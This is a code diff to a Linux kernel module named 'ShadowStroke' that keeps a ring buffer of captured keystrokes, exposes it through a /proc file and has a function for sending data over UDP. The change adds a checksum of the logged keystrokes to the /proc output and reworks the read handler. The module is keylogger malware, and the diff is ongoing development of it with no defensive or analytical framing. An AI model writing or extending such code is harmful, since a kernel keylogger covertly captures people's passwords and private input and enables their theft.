@@ -222,11 +222,23 @@ static int shadowstroke_send_udp(const char *data, size_t len)
     return ret;
 }
 
+static unsigned int shadowstroke_checksum(const char *buf, size_t head, size_t tail, size_t size) {
+    unsigned int sum = 0;
+    size_t i = tail;
+    while (i != head) {
+        sum += (unsigned char)buf[i];
+        i = (i + 1) % size;
+    }
+    return sum;
+}
+
 static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_t count, loff_t *ppos)
 {
     ssize_t ret = 0;
     size_t len = 0, i;
     char *tmp;
+    char checksum_str[64];
+    unsigned int sum;
     tmp = kmalloc(shadowstroke_buf_size, GFP_KERNEL);
     if (!tmp)
         return -ENOMEM;
@@ -237,20 +249,33 @@ static ssize_t shadowstroke_proc_read(struct file *file, char __user *buf, size_
         i = (i + 1) % shadowstroke_buf_size;
     }
     tmp[len] = '\0';
+    sum = shadowstroke_checksum(keystroke_buf, buf_head, buf_tail, shadowstroke_buf_size);
     mutex_unlock(&shadowstroke_buf_mutex);
 
-    if (*ppos >= len) {
-        kfree(tmp);
-        return 0;
+    snprintf(checksum_str, sizeof(checksum_str), "\n[ShadowStroke] Checksum: 0x%08x\n", sum);
+    if (*ppos < len) {
+        if (count > len - *ppos)
+            count = len - *ppos;
+        if (copy_to_user(buf, tmp + *ppos, count)) {
+            kfree(tmp);
+            return -EFAULT;
+        }
+        *ppos += count;
+        ret = count;
+    } else if (*ppos >= len && *ppos < len + strlen(checksum_str)) {
+        size_t cpos = *ppos - len;
+        size_t ccount = strlen(checksum_str) - cpos;
+        if (count > ccount)
+            count = ccount;
+        if (copy_to_user(buf, checksum_str + cpos, count)) {
+            kfree(tmp);
+            return -EFAULT;
+        }
+        *ppos += count;
+        ret = count;
+    } else {
+        ret = 0;
     }
-    if (count > len - *ppos)
-        count = len - *ppos;
-    if (copy_to_user(buf, tmp + *ppos, count)) {
-        kfree(tmp);
-        return -EFAULT;
-    }
-    *ppos += count;
-    ret = count;
     kfree(tmp);
     return ret;
 }
